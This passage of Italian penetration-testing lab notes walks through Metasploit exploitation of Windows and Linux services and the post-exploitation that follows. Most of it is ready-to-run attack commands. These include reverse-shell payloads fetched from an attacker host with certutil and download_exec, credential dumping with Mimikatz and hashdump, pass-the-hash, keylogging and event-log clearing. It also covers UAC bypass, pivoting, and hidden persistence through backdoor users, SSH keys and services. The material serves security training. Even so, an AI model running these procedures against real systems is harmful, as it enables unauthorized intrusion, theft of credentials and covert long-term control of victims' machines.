> Nota: Impostare `PASSWORD anything` è un workaround necessario: MSF userà comunque il file `PASS_FILE`, ma il modulo richiede che la variabile non sia vuota per partire.

#### 🚀 Esecuzione Comandi e Meterpreter

Una volta ottenute le credenziali, possiamo eseguire comandi o ottenere una sessione avanzata.

Test Esecuzione Comandi:

```
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD <password_trovata>
set CMD whoami
run
```

#### Ottenere Sessione Meterpreter

Per passare da una semplice shell a Meterpreter (Post-Exploitation):

```
use exploit/windows/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD <password_trovata>
set FORCE_VBS true # Fix per errori con PowerShell CommandStager
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <Tuo_IP>
exploit
```

{% hint style="info" %}
Troubleshooting: Se il modulo `winrm_script_exec` fallisce, è spesso dovuto al sistema di "Command Staging". Impostare `FORCE_VBS` a `true` forza l'uso di Visual Basic Script, aggirando eventuali restrizioni di esecuzione di PowerShell sul target.
{% endhint %}

### 🐱 Exploiting Apache Tomcat & Meterpreter Upgrade

L'obiettivo è sfruttare una vulnerabilità di Remote Code Execution (RCE) su Apache Tomcat (v8.5.19) e aggiornare la shell limitata iniziale a una sessione Meterpreter completa.

#### 🔍 1. Enumerazione e Accesso Iniziale

Identifichiamo il servizio e otteniamo una shell di comando (CMD).

```
# Enumerazione
db_nmap -sV -p 8080 10.2.20.126
services

# Exploitation (JSP Upload Bypass)
search tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set SHELL cmd
run
```

_Nota: Questa fase fornisce una shell Java limitata che non supporta i moduli di post-exploitation avanzati._

#### 🛠️ 2. Preparazione dell'Upgrade (Msfvenom & Automation)

Generiamo il payload Windows e automatizziamo il listener per risparmiare tempo.

#### Generazione Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > shell.exe
```

#### Automazione Handler (handler.rc)

Crea uno script per avviare il listener all'istante:

```
echo "use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run" > handler.rc

# Avvio rapido
msfconsole -r handler.rc
```

#### 🚚 3. Trasferimento con Certutil ed Esecuzione

Dalla shell CMD ottenuta nel punto 1, scarichiamo ed eseguiamo il payload Meterpreter.

#### Hosting e Download

```
# Sulla Kali (nella cartella del file shell.exe):
python3 -m http.server 80

# Sulla Vittima (shell CMD):
certutil -urlcache -f http://10.10.10.5/shell.exe shell.exe
```

#### Esecuzione e Stabilizzazione

```
# Sulla Vittima (shell CMD):
shell.exe

# Su Metasploit (una volta aperta la sessione):
getuid
run post/windows/manage/migrate # Migrazione automatica per stabilità
```

### 📊 Tabella Strumenti e Variabili

| **Strumento / Variabile** | **Funzione**                                              |
| ------------------------- | --------------------------------------------------------- |
| `certutil`                | Download file tramite URL su Windows (nativo).            |
| `.rc script`              | Automazione comandi MSF all'avvio.                        |
| `LHOST / LPORT`           | IP e Porta dell'attaccante per la connessione di ritorno. |
| `jsp_upload_bypass`       | Exploit per caricare file JSP dove non permesso.          |

> Perché questo giro? Molti exploit (come questo di Tomcat) caricano shell Java che sono "instabili" per la post-exploitation. L'uso di certutil per caricare un eseguibile nativo Windows (.exe) è la tecnica standard per ottenere una Meterpreter stabile e potente.

## Linux Exploitation

### Creazione workspace MSF ed enumeration del target

```
service postgresql start
msfconsole
workspace -a nomeworkspace
setg RHOSTS 192.86.51.3
db_nmap -sS -sV -O 192.209.183.3
```

### Upgrade da command shell a meterpreter

```
CTRL+Z //per mettere in background la sessione command shell aperta precedentemente
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST eth1
set SESSION 1
run
sessions
sessions 2
sysinfo
getuid
```

### Exploiting A Vulnerable FTP Server

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
info
run
ls
/bin/bash -i
```

### Exploiting Samba

<pre><code>search type:exploit name:samba
<strong>use exploit/linux/samba/is_known_pipename
</strong>show options
check //controlliamo se il target è vulnerabile e se c'è una share writable
info //per controllare che l'exploit sia compatible con la versione di samba del target
run
ls
pwd
</code></pre>

### Exploiting a Vulnerable SSH Server

```
search libssh_auth_bypass
use auxiliary/scanner/ssh/libssh_auth_bypass
show options
set SPAWN_PTY true
run
sessions
sessions 1
whoami
cat /etc/*release //per capire la versione di linux
uname -r  //per verificare versione del kernel
```

### Exploiting A Vulnerable SMTP Server (Haraka)

```
search type:exploit name:haraka
use exploit/linux/smtp/haraka
show options
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http //è un unstaged payload
set LHOST eth1
run
sysinfo
getuid
```

## Post Exploitation Fundamentals

### Comandi fondamentali in Meterpreter

#### Post Exploitation

```
sysinfo
getuid
help
shell //per ottenere una shell del SO, per eseguire i comandi
CTRL+C //per terminare la shell e tornare a meterpreter
ps //lista i processi running sul sistema
migrate 580 //per migrare a processi ai quali abbiamo permesso
migrate -N apache2 //per migrare a processi con il loro nome invece del PID
execute -f ifconfig //crea un processo ed esegue direttamente il comando
```

#### Gestire le sessioni

```
background //oppure CTRL+Z
kill //killa la sessione
sessions //permette di gestire tutte le sessioni attive
sessions -h
sessions -C sysinfo -i 1  //Per eseguire un comando su una meterpreter, senza renderla interattiva
sessions 1
background
sessions -h
sessions -k 1 //per killare la sessione 1
sessions -l //lista le sessioni attive
sessions -n xoda -i 1 //assegna un nome ad una sessione
sessions xoda //per interagire con essa
```

#### Navigare il file system

```
ls 
lls //come ls -al
pwd 
cd ..
ls
cat flag1
edit flag1 //apre il file in vim, chiudi con :q
cd "Secret Files"
cat .flag2
cd ..
ls
downlad flag5.zip
CTRL+Z
ls
unzip flag5.zip
ls
cat list //il file estratto, che ci dice di guardare l'MD5 hash di /bin/bash. Quindi torniamo nella meterpreter session
checksum md5 /bin/bash //e l'output è la flag
getenv PATH //per enumerare vairabili d'ambiente come PATH
getenv TERM //il terminale assegnato a questo utente, valido per utenti che possono accedere tramite terminale
search -d /usr/bin -f *backdoor*
search -f *.php
download flag1
sessions 1
mkdir test
rmdir test
lcd /root/Desktop/tools  //Change to tools directory on the local machine
upload /usr/share/webshells/php/php-backdoor.php  //Upload a PHP webshell to app directory of the remote machine
```

### Upgrading Command Shells To Meterpreter Shells

#### Utilizzando un modulo post-exploitation

```
search shell_to_meterpreter
use post/multi/menage/shell_to_meterpreter
show options
set SESSION 1
set LHOST eth1
run
sessions
sessions 2
exit
sessions
```

#### Metodo più semplice, con un utile comando

```
sessions
sessions -h
sessions -u 1 //il flag -u fa l'upgrade da shell a meterpreter session
```

## Windows Post Exploitation

### Moduli utili per Post Exploitation Windows

#### Windows Meterpreter comandi utili

```
sysinfo
getuid
help
getsystem
getuid
hashdump
show_mount
ps
migrate 2212 //oppure migrate explorere.exe
cd C:\\
dir
cat flag.txt
download flag.txt

hashdump
vari webcam commands come:
webcam_snap
//vari user interface commands
keyscan_start //start keylogger
screenshot

loot // visualizzare i dati salvati da esecuzione di moduli post exploitation

CTRL+Z //per mettere in background
```

#### Migrare il processo della meterpreter session, o migrare l'architettura

```
search migrate platform:windows //per cambiare architettura del meterpreter payload
//use post/windows/menage/archmigrate
use post/windows/menage/migrate //per migrare Process ID
show options
set SESSION 1
run
```

#### Elenca i privilegi dell'utente Windows della sessione attiva

```
search win_privs
use post/windows/gather/win_privs //elenca i privilegi dell'utente windows
show options
set SESSION 1
run //mostra informazioni come se è admin, è system, è nell'admin group, User Access Control abilitato per fare privesc
```

#### Lista storico utenti loggati e attualmente loggati

```
search enum_logged_on
use post/windows/gather/enum_logged_on_users
show options
set SESSION 1
run
```

#### Controlla se è una VM

```
search checkvm
use post/windows/gather/checkvm
show options
set SESSION 1
run
```

#### Enumerare i programmi installati sulla macchina

```
search enum_applications
use post/windows/gather/enum_applications
set SESSION 1
run
loot // i dati dei risultati sono salvati in file nascosti, che possiamo visualizzare con loot
```

#### Check antivirus e cartelle escluse dall'AV

```
search type:post platform:windows enum_av
use post/windows/gather/enum_av_excluded
show options
set SESSION 1
run
```

è utile sapere le cartelle con esclusioni perché possiamo usarle per caricarci nostri virus e payload in modo che non vengano individuati dall'antivirus.

#### Enumerare i PC che fanno parte del dominio

```
search enum_computer
use post/windows/gather/enum_computers
show options
set SESSION 1
run
```

#### Enumerare le patch di Microsoft installate

```
search enum_patches
use post/windows/gather/enum_patches
show options
set SESSION 1
run // e ci restituisce un errore dicendo di provare a migrare su un altro processo
sessions 1
ps //guardiamo gli altri processi disponibili e individuiamo svchost.exe che è SYSTEM
migrate 896
background
run // ci dà ancora errore allora andiamo a cercare da soli questa info
sessions 1
shell
systeminfo //comando di windows che ci mostra tra le altre cose tutte le patch installate
CTRL+C
background
```

è possibile impostare la singola patch di Windows (il relativo KB) che vogliamo controllare se è stata installata.

#### Enumerare le shares disponibili

```
search enum_shares
use post/windows/gather/enum_shares
show options
//l'opzione ENTERED serve per vedere le share recentemente inserite nel path di esplora risorse
set SESSION 1
run
```

#### Check RDP abilitato oppure abilita RDP sul target

```
search rdp platform:windows
use post/windows/menage/enable_rdp
show options
set SESSION 1
//non abbiamo le credenziali quindi non riusciamo a connetterci, ma possiamo usarlo per fare il check
run
// verifica se RDP è abilitato oppure lo abilita
```

### Bypassing UAC

#### Local enumeration

```
getsystem //ma fallisce
getprivs
shell
net users // e abbiamo gli utenti: admin, Administrator e Guest.
net localgroup administrators //e vediamo che admin è nel gruppo amministratori, quindi possiamo disattivare UAC in modo semplice
CTRL+C
ps -S explorer.exe
migrate 2124 // Please note the explorer.exe arch is x64 bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.
background
sessions
```

#### Privilege exploitation / Bypassing UAC

```
search bypassuac
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
show options
set SESSION 1
set LPORT 4433 //perché la 4444 era già occupata dall'altra sessione attiva
run // ma ci viene detto che l'exploit è fallito perché il target è x64
set TARGET Windows\ x64 //suggerito con TAB
run
sysinfo
getuid //siamo ancora admin, ma ora l'UAC è stato disabilitato quindi...
getsystem // funziona l'escalation dei privilegi
getuid // siamo NT AUTHORITY\SYSTEM
hashdump
```

### Token Impersonation With Incognito

```
getuid
getprivs //Abbiamo SeImpersonatePrivilege quindi possiamo impersonare un token
hashdump //per dimostrare che fallisce e non abbiamo i permessi
cd C:\\Users
cd Administrator //fallisce, non abbiamo i permessi
// Ora facciamo Privilege Escalation con il modulo Incognito
load incognito
list tokens -u //per gli user access tokens: mostra sia delegation che impersonation tokens
impersonate_token "ATTACKDEFENSE\Administrator" //che è uno dei delegation token disponibili
getuid
hashdump //fallsice perché dobbiamo migrare il processo, perché il processo nel quale siamo è ancora associato all'utente LOCAL SERVICE
ps
migrate 3544 //per migrare a explorer.exe
hashdump //ora ci mostra gli hash
cd C:\\
cd Users
cd Administrator
dir //ora abbiamo accesso alla cartella Administrator
```

### Dumping Hashes with Mimikatz

#### Kiwi module

Kiwi è una built-in meterpreter extension.

```
load kiwi
?
creds_all
lsa_dump_sam
lsa_dump_secrets
```

#### Mimikatz <a href="#mimikatz" id="mimikatz"></a>

Mimikatz è un eseguibile che bisogna avere sulla macchina target. Kali Linux lo mette già a disposizione nella cartella /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

Dalla meterpreter session:

```
pwd 
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
dir
.\mimikatz.exe
privilege::debug // se "20 OK" allora abbiamo i permessi per eseguire hash extraction from memory
sekurlsa::logonpasswords // se presenti in memoria le password usate nei login
lsadump::sam //ci restituisce SysKey, SAMKey, NTLM degli utenti, RID
lsadump::secrets
```

### Pass-the-Hash With PSExec

```
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
show options //la porta 445 va bene per SMB, e dovremo inserire gli hash come User e Password
set SMBUser Administrator
set SMBPass <LM HASH>:<NTLM Hash>
exploit
sysinfo
getuid
CTRL+Z
sessions
```

### Establishing Persistence On Windows

{% hint style="info" %}
Per poter stabilire persistenza sul sistema necessitiamo di un accesso come utente amministratore!

Quindi: prima privilege escalation e poi persistence
{% endhint %}

#### Persistence Service

```
search platform:windows persistence
use exploit/windows/local/persistence_service
set payload windows/x64/meterpreter/reverse_tcp
show options
// è possibile impostare SERVICE_NAME per camuffare il servizio con un nome non sospetto, oppure impostare anche REMOTE_EXE_PATH e REMOTE_EXE_NAME
set SESSION 1
// possiamo modificare LPORT. Non verrà creata automaticamente una sessione, 
// ma ci dà la possibilità di rimanere a disposizione per quando creeremo un handler su quella LPORT
run
set payload windows/meterpreter/reverse_tcp //perché supporta solo il staged payload a 32bit
exploit
getuid
exit
```

#### Riavere accesso al target tramite il servizio persistente:

```
sessions
sessions -K //termina tutte le sessioni
use multi/handler
set payload windows/meterrpeter/reverse_tcp //lo stesso payload usato per creare la persistenza con il modulo persistence_service
show options
set LHOST eth1
set LPORT 4444 //la stessa porta usata per creare la persistenza
run
exit
run
sysinfo
getuid
```

### Enabling RDP

```
search enable_rdp
use post/windows/manage/enable_rdp
show options
// è possibile impostare la PASSWORD per un nuovo utente da usare per RDP, 
// ma nel nostro caso cambieremo la password dell'utente NT AUTHORITY\SYSTEM 
// con il quale ci eravamo loggati via exploit BadBlue
// L'opzione FORWARD è utile per i casi di pivoting
set SESSION 1
exploit
db_nmap -p 3389 10.2.19.254 //controlliamo che RDP sia attivo e aperto
```

#### Cambiare password per accedere via RDP

Questo è sconsigliato in casi reali perché ovviamente bloccherebbe fuori l'amministratore e sarebbe un chiaro segnale che il sistema è stato hackerato. In casi di standard penetration test meglio usare un altro utente differente creandolo con il modulo MSF enable\_rdp, talvolta è necessario anche aggiungerlo al gruppo Administrators.

```
sessions 1
shell
net users
net user Administrator hacker_123321
CTRL+C
```

#### Accesso via RDP (da Kali Linux)

```
xfreerdp /u:administrator /p:hacker_123321 /v:10.2.19.254
```

### Keylogging (in Meterpreter)

```
help
keyscan_start //avvia il keylogging
keyscan_dump //mostra il log dei tasti sniffati: <Shift> è il maiuscolo, <^H> è backspace, ecc...
//se dovessimo avere problemi nel dump possiamo riavviare il servizio:
keyscan_stop
keyscan_start
keyscan_dump
//keyboard_send e keyevent sono ridondanti se abbiamo già accesso al target via meterpreter, i comandi li possiamo inviare direttamente da qui.
```

### Clearing Windows Event Logs

```
//Dentro meterpreter
clearev
//è importante anche eliminare (con il comando rm) eventuali file malevoli caricati sul sistema
```

{% hint style="warning" %}
è necessario avere permessi amministrativi per poter pulire il Windows Event Log!
{% endhint %}

### Pivoting

<figure><img src="../.gitbook/assets/image (29) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una volta exploitato e avuto accesso a Victim 1 possiamo fare pivoting verso la rete interna a cui appartiene Victim 1, che ci permette di raggiungere Victim 2.

Utilizziamo la sessione meterrpeter su Victim 1 per accedere a Victim 2, passando effettivamente per Victim 1 altrimenti da Attacker non riusciremmo a raggiungere Victim 2.

#### Exploitiamo la prima vittima (Victim 1)

```
service postgresql start && msfconsole
workspace -a pivoting
db_nmap -sV 10.2.27.1 //Victim1
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS 10.2.27.1 //Victim1
exploit
```

#### Facciamo pivoting verso Victim2

```
//Listiamo le interfacce di rete di Victim1 e individuiamo qual è la rete interna sulla quale si trova Victim 2
ipconfig
run autoroute -s 10.2.27.0/20 //impostiamo l'autoroute sulla rete a cui appartiene l'IP di Victim1, che è la stessa rete di Victim2
//ora possiamo accedere a questa sottorete via msfconsole attraverso la sessione meterpreter che lasciamo attiva su Victim1
background
sessions
sessions -n victim-1 -i 1 //rinominiamo la sessione per non confonderci
sessions
```

#### Enumeriamo Victim2

{% hint style="warning" %}
Attenzione: non possiamo usare nmap o strumenti esterni per scannerizzare la sottorete perché il routing funziona solo con Metasploit Framework ed i suoi moduli
{% endhint %}

```
//Usiamo portscan module per scannerizzare la rete che abbiamo aggiunto con autoroute
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.2.27.187 //Victim2
set PORTS 1-100 //per risparmiare un po' di tempo limitiamo le porte, a piacimento
exploit
```

Se vogliamo fare un nmap scan ad esempio, avremo bisogno di impostare un port forwarding della porta 80 di Victim2 su una porta locale della nostra istanza Kali Linux, per impostarlo dobbiamo farlo nella sessione meterpreter di Victim1.

#### Portforwarding della porta 80 di Victim2 <a href="#portforwarding-della-porta-80-di-victim2" id="portforwarding-della-porta-80-di-victim2"></a>

Impostiamo un port forwarding della porta 80 di Victim2 su una porta locale della nostra istanza Kali Linux, per impostarlo dobbiamo farlo nella sessione meterpreter di Victim1.

```
sessions 1
portfwd add -l 1234 -p 80 -r 10.2.27.187 //facciamo forward della porta 80 di Victim2 sulla 1234 locale (Kali)
background
```

#### Enumeration ed exploitation del servizio di Victim2 tramite port forwarding

Ora possiamo fare lo scan del servizio running sulla porta 80 di Victim2 con gli strumenti di Kali come Nmap effettuando lo scan sulla porta 1234 locale.

```
db_nmap -sS -sV -p 1234 localhost
search badblue
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp //perché una reverse connection non sarebbe possibile
show options
set RHOSTS 10.2.27.187
set LPORT 4433
exploit
sysinfo
background
sessions
sessions -n victim-2 -i 2
sessions
sessions 2
sysinfo
background
sessions 1
sysinfo
```

***

## Linux Post Exploitation

### Moduli utili per Post Exploitation Linux

#### Comandi utili per Local enumeration

```
shell
/bin/bash -i
whoami
cat /etc/passwd //listare account sul sistema
groups root // vedere i gruppi ai quali l'utente usato fa parte
cat /etc/*issue //Versione OS
uname -r //versione kernel
uname -a //hostname, versione kernel e info aggiuntive
ifconfig 
ip a s //network enumeration delle interfaccie sul sistema
netstat -antp //listare servizi che ascoltano sulle porte aperte
ps aux //processi sul sistema
env //variabili d'ambiente dell'utente
CTRL+C
sessions-u 1
sessions
```

#### Elenca le configurazioni Linux

```
search enum_configs
show options
set SESSION 3
run
//Tutti i file di configurazione che non danno errore vengono salvati nel DB
loot // Mostra tutti i file di configurazione salvati nel DB con un nome che spiega cos'è
cat /root/.msf4/loot /20211126230647_Linux_PE_......txt //faccio il cat ad esempio del file delle shell sul sistema
```

#### Environment Variables

```
search env platform:linux
use post/multi/gather/env
show options
set SESSION 3
run
```

#### Network information

Raccoglie informazioni come ssh, routing table, network config, firewall config, DNS, if-up/if-down...

```
search enum_network
use post/linux/gather/enum
set SESSION 3
run
loot
```

Ad esempio con il file delle configurazioni DNS capiamo che il server è hostato in cloud su linode, quindi è una info in più.

#### Sistemi di protezione: security features abilitate (hardening)

```
search enum_protections
use post/linux/gather/enum_protections
info
set SESSION 3
run
notes //le info sono state salvate in notes
```

#### Informazioni sul sistema

```
search enum_system
use post/linux/gather/enum_system
show options
info
set SESSION 3
run
loot
```

#### Check VM

```
search checkvm
use post/linux/gather/checkvm
show options
set SESSION 3
run
```

#### Check Docker

```
search checkcontainer
use post/linux/gather/checkcontainer
show options
set SESSION 3
run
```

#### Enum user history

Va a identificare tutti i file con la history dei comandi di tutti gli account, sia quelli di user account che i service account.

```
search enum_user_history
use post/linux/gather/enum_users_history
set SESSION 3
run
loot
//cat file bash history di root
```

#### Enum network information

```
use post/linux/gather/enum_network
set SESSION 1
run
```

#### Multi Manage System Remote TCP Shell Session

This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.

```
use post/multi/manage/system_session
set SESSION 1
set TYPE python
set HANDLER true
set LHOST 192.216.221.2
run
```

Now, let’s create a bash file which will create a user on the target machine by uploading a test.sh file and execute it.

```
useradd hacker
useradd test
useradd nick
```

Now, let’s run the Apache server on the attacker’s machine and copy the test.sh file in the root folder.

```
/etc/init.d/apache2 start
cp test.sh /var/www/html
```

#### Download exec

```
use post/linux/manage/download_exec
set URL http://192.216.221.2/test.sh
set SESSION 1
run
```

#### Credenziali SSH

```
use post/multi/gather/ssh_creds
set SESSION 1
run
```

#### Credenziali Docker

```
use post/multi/gather/docker_creds
set SESSION 1
run
```

#### Hashdump

```
use post/linux/gather/hashdump
set SESSION 1
set VERBOSE true
run
```

#### Gather eCryptfs Metadata

This module will collect the contents of all users' .ecrypts directories on the targeted machine. Collected "wrapped-passphrase" files can be cracked with John the Ripper (JtR) to recover "mount passphrases".

```
use post/linux/gather/ecryptfs_creds
set SESSION 1
run
```

#### Linux Gather NetworkManager 802-11-Wireless-Security Credentials&#xD;

This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from Linux NetworkManager connection configuration files.

```
use post/linux/gather/enum_psk
set SESSION 1
run
```

#### Phpmyadmin credentials stealer

```
use post/linux/gather/phpmyadmin_credsteal
set SESSION 1
run
```

### Privilege Escalation: Exploiting a vulnerable program

```
ps aux //per vedere se ci sono processi di root
cat /bin/check-down //il contenuto ci dice che un file chkrootkit è eseguito ogni 60 secondi
chkrootkit --help  //Chkrootkit è una utility linux che cerca su linux dei rootkit, è un anti rootkit.
chkrootkit -V //è 0.49, versione vulnerabile
CTRL+C
CTRL+Z
search chkrootkit
use exploit/unix/local/chkrootkit
show options
info
set CHKROOTKIT /bin/chkrootkit //perché linux riesce ad identificare il binary vero attuale
set SESSION 2
set LHOST 192.124.219.2
show options
sessions  //per controllare che non usiammo la porta presente in LPORT
exploit //crea un crontab per attendere che venga eseguito chkrootkit dal cron
/bin/bash -i
whoami //abbiamo ora root privileges
```

### Dumping Hashes with Hashmap

```
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 3
run
loot
cat <passwd>
cat <shadowfile> //non contiene le password ma asterischi perché le password di quegli account non sono state configurate
sessions 3
shell
/bin/bash -i
passwd root //cambiamo la password di root
useradd -m alexis -s /bin/bash //aggiungiamo un nuovo utente
passwd alexis
CTRL+Z
run //ora il modulo ci restituisce utente:hashpassword:UID:GID::homedirectory:
cat <newunshadowedfile>
//nell'hash della password i primi 3 caratteri come ad esempio $6$ indicano il tipo di algoritmo di hash utilizzato,
// in particolare più è alto il numero più è sicuro. $6$ è sha512
```

L'unica cosa che possiamo fare con gli hash è craccarli se possibile, se le password sono semplici. Non si può fare molto altro anche perché per avere gli hash devi già essere utente root quindi ormai non serve più autenticarsi come altri.

### Establishing Persistence On Linux

#### Creare un backdoor user per avere accesso a piacere

```
bash
/bin/bash -i
cat /etc/passwd //per vedere quali utenti esistono sul sistema
//l'utente creato dovrebbe nascondersi ed essere difficile da individuare, quindi simile a un service account
useradd -m /var/www/html ftp -s /bin/sbin/nologin //specifichiamo la home directory come /var/www ma non è necessario, possiamo lasciare vuoto. Poi il nome utente (ftp) e infine con -s impostiamo l'actual terminal session (in questo caso è quella data agli user service, per nasconderci meglio.
passwd ftp //impostiamo la password di ftp
groups root
usermod -aG root ftp //aggiungiamo ftp al gruppo root
groups ftp
usermod -u 15 ftp //per modificare l'id dell'utente per non far capire che lo abbiamo creato manualmente
```

#### SSH Key Persistence

Metodo consigliato per garantire persistenza. Questo metodo è difficile da individuare perché la chiave pubblica SSH che è stata aggiunta nella home directory dell'utente non è qualcosa che è acceduta spesso. Quindi è difficile che l'utente se ne accorga.

```
use post/linux/manage/sshkey_persistence
show options
set CREATESSHFOLDER true //perché in alcuni casi l'utente potrebbe non avere la cartella per SSH già presente
set SESSION 4
info
exploit //ha creato le chiavi ssh per tutti gli utenti, inclusi i service users.
loot //per trovare la private key che ci ha generato e salvato in un file
cat <FilePrivateKey>
//copiamo la chiave e la utilizziamo per accedere
exit -y
vim ssh_key // e incolliamo la chiave privata in questo file
chmod 0400 ssh_key
ssh -i ssh_key root@192.182.80.3 //<target ip address>
//abbiamo ora accesso al target come root e senza dover fornire password
ls
whoami
exit
ssh -i ssh_key ftp@192.182.80.3 // e funziona anche per accedere all'utente ftp
```

#### APT Package Manager Persistence Module

```
use exploit/linux/local/apt_package_manager_persistence
show options
info
// Ma in questo caso dobbiamo fare affidamento sul fatto che venga eseguito il packet manager, non potremmo connetterci quando vogliamo.
```

#### Cron Persistence Module

Crea un cronjob che costantemente tenta di connettersi ad un nostro handler che dovremmo predisporre in ascolto.

I cronjobs possono essere però facilmente visti e cancellati da un amministratore legittimo.

```
use exploit/linux/local/cron_persistence
show options
set SESSION 4
set LPORT 4422
set LHOST 192.182.80.2 //(eth1)
exploit //ma pare non funzioni
```

#### Service Persistence Module

Crea un servizio e lo marca come auto-restart. Ma è valido solo per alcune versioni di OS e bisogna avere permessi sufficienti

```
use exploit/linux/local/service_persistence
show options
set SESSION 4
set payload cmd/unix/reverse_python
show options
set LHOST 192.182.80.2
set LPORT 4422
exploit //in questo caso fallisce
set target 3 //per settare a systemd invece che system V
exploit // funziona parzliamente, non crea la sessione
set target 4 //proviamo con systemd user
exploit // anche in questo caso non crea la sessione
```

### Metasploit GUI: Armitage

è possibile utilizzare Armitage, che è la GUI di Metasploit. Per far ciò bisogna prima avviare il DB Postgresql usato da Metasploit Framework.

```
service postgresql start && msfconsole
db_status
//in un secondo tab:
armitage
```

Comodo per fare Pivoting visualizzando quello che si sta facendo, inoltre le autoroute vengono impostate in maniera più veloce via interfaccia grafica. Per dettagli vedere il capitolo "Metasploit GUIs" all'interno di "Post Exploitation".
